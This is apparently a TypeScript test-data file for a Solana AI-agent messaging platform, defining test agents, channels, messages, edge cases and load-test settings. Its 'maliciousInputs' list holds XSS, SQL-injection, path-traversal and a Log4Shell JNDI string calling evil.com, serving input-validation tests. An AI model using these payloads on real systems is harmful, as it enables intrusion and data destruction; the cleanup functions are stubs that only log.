import { generateKeyPairSigner, type KeyPairSigner } from '@solana/signers';
import { address, type Address } from '@solana/addresses';

export interface AgentTestData {
  name: string;
  description: string;
  capabilities: number;
  metadata: {
    version: string;
    type: 'ai' | 'human' | 'hybrid';
    tags: string[];
  };
  keypair: KeyPairSigner;
}

export interface ChannelTestData {
  name: string;
  description: string;
  isPrivate: boolean;
  features: string[];
  id: string;
}

export interface MessageTestData {
  content: string;
  type: 'direct' | 'channel' | 'system' | 'command';
  encrypted: boolean;
  metadata: Record<string, any>;
}

/**
 * Deterministic test agents following testing standards
 */
export const TEST_AGENTS: AgentTestData[] = [
  {
    name: 'TestBot Alpha',
    description: 'Primary test agent for basic functionality',
    capabilities: 0b11111, // All capabilities enabled
    metadata: {
      version: '1.0.0',
      type: 'ai',
      tags: ['test', 'primary', 'full-featured']
    },
    keypair: await import('@solana/signers').then(m => m.generateKeyPairSigner()) // Web3.js v2 pattern
  },
  {
    name: 'TestBot Beta',
    description: 'Secondary test agent for communication tests',
    capabilities: 0b00001, // Communication only
    metadata: {
      version: '1.0.0',
      type: 'ai',
      tags: ['test', 'secondary', 'communication']
    },
    keypair: await import('@solana/signers').then(m => m.generateKeyPairSigner()) // Web3.js v2 pattern
  },
  {
    name: 'TestBot Gamma',
    description: 'Performance test agent for load testing',
    capabilities: 0b01010, // Trading and analysis
    metadata: {
      version: '1.0.0',
      type: 'hybrid',
      tags: ['test', 'performance', 'trading', 'analysis']
    },
    keypair: await import('@solana/signers').then(m => m.generateKeyPairSigner()) // Web3.js v2 pattern
  }
];

/**
 * Test channels for various scenarios
 */
export const TEST_CHANNELS: ChannelTestData[] = [
  {
    name: 'General Testing',
    description: 'Primary channel for general test communications',
    isPrivate: false,
    features: ['encryption', 'ai-agents'],
    id: 'ch_test_general_001'
  },
  {
    name: 'Private Test Group',
    description: 'Private channel for secure communication tests',
    isPrivate: true,
    features: ['encryption', 'token-gate', 'voting'],
    id: 'ch_test_private_001'
  },
  {
    name: 'Performance Channel',
    description: 'Channel for load and performance testing',
    isPrivate: false,
    features: ['ai-agents', 'files'],
    id: 'ch_test_performance_001'
  }
];

/**
 * Test messages for different scenarios
 */
export const TEST_MESSAGES: MessageTestData[] = [
  {
    content: 'Hello, this is a test message!',
    type: 'direct',
    encrypted: true,
    metadata: { priority: 'normal', timestamp: 1640995200000 }
  },
  {
    content: 'Channel announcement for testing',
    type: 'channel',
    encrypted: false,
    metadata: { priority: 'high', timestamp: 1640995260000 }
  },
  {
    content: 'System notification test',
    type: 'system',
    encrypted: false,
    metadata: { priority: 'low', timestamp: 1640995320000 }
  },
  {
    content: '/help test command',
    type: 'command',
    encrypted: false,
    metadata: { command: 'help', args: ['test'], timestamp: 1640995380000 }
  }
];

/**
 * Edge case test data following testing standards
 */
export const EDGE_CASE_DATA = {
  // Boundary values
  maxLengthName: 'x'.repeat(50), // Maximum allowed name length
  emptyName: '',
  unicodeName: '🤖🚀💬📊🔧',
  
  // Large content
  maxMessage: 'x'.repeat(1000), // Maximum message length
  emptyMessage: '',
  unicodeMessage: '🎉'.repeat(100),
  
  // Invalid data
  invalidCapabilities: [-1, 999999, NaN, Infinity],
  invalidNetworks: ['invalid', '', null, undefined],
  
  // Performance data
  largeDataset: Array.from({ length: 1000 }, (_, i) => ({
    id: i,
    data: `performance_test_data_${i}`,
    timestamp: Date.now() + i
  })),
  
  // Security test data
  maliciousInputs: [
    '<script>alert("xss")</script>',
    '"; DROP TABLE agents; --',
    '../../etc/passwd',
    '\x00\x01\x02\x03',
    'javascript:alert(1)',
    'data:text/html,<script>alert(1)</script>',
    '${jndi:ldap://evil.com/a}'
  ]
};

/**
 * Network test scenarios
 */
export const NETWORK_SCENARIOS = {
  normal: {
    latency: 50, // 50ms
    packetLoss: 0,
    bandwidth: 1000 // 1Gbps
  },
  slow: {
    latency: 500, // 500ms
    packetLoss: 0.1, // 10% packet loss
    bandwidth: 10 // 10Mbps
  },
  unstable: {
    latency: 200, // Variable latency
    packetLoss: 0.05, // 5% packet loss
    bandwidth: 100 // 100Mbps
  }
};

/**
 * Performance test configuration
 */
export const PERFORMANCE_TESTS = {
  loadTest: {
    agentCount: 100,
    messageRate: 1000, // messages per second
    duration: 60000, // 1 minute
    concurrency: 10
  },
  stressTest: {
    agentCount: 1000,
    messageRate: 10000, // messages per second
    duration: 300000, // 5 minutes
    concurrency: 50
  },
  enduranceTest: {
    agentCount: 50,
    messageRate: 100, // messages per second
    duration: 3600000, // 1 hour
    concurrency: 5
  }
};

/**
 * Test data factory functions
 */
export class TestDataFactory {
  static async createRandomAgent(): Promise<AgentTestData> {
    const names = ['Alpha', 'Beta', 'Gamma', 'Delta', 'Epsilon'];
    const types: ('ai' | 'human' | 'hybrid')[] = ['ai', 'human', 'hybrid'];
    
    return {
      name: `TestBot ${names[Math.floor(Math.random() * names.length)]}`,
      description: `Generated test agent ${Date.now()}`,
      capabilities: Math.floor(Math.random() * 32), // Random capabilities
      metadata: {
        version: '1.0.0',
        type: types[Math.floor(Math.random() * types.length)],
        tags: ['test', 'generated', 'random']
      },
      keypair: await generateKeyPairSigner()
    };
  }

  static createRandomMessage(): MessageTestData {
    const types: ('direct' | 'channel' | 'system' | 'command')[] = ['direct', 'channel', 'system', 'command'];
    const contents = [
      'Random test message',
      'Performance test data',
      'Automated test content',
      'Generated message payload'
    ];

    return {
      content: `${contents[Math.floor(Math.random() * contents.length)]} ${Date.now()}`,
      type: types[Math.floor(Math.random() * types.length)],
      encrypted: Math.random() > 0.5,
      metadata: {
        timestamp: Date.now(),
        random: Math.random(),
        generated: true
      }
    };
  }

  static createPerformanceDataset(size: number): any[] {
    return Array.from({ length: size }, (_, i) => ({
      id: i,
      agent: this.createRandomAgent(),
      message: this.createRandomMessage(),
      timestamp: Date.now() + i,
      sequence: i
    }));
  }
}

/**
 * Cleanup utilities for test data
 */
export class TestDataCleanup {
  static async cleanupAgents(agentIds: string[]): Promise<void> {
    // Implementation would clean up test agents from blockchain
    console.log(`Cleaning up ${agentIds.length} test agents`);
  }

  static async cleanupChannels(channelIds: string[]): Promise<void> {
    // Implementation would clean up test channels
    console.log(`Cleaning up ${channelIds.length} test channels`);
  }

  static async cleanupAll(): Promise<void> {
    // Implementation would clean up all test data
    console.log('Cleaning up all test data');
  }
} 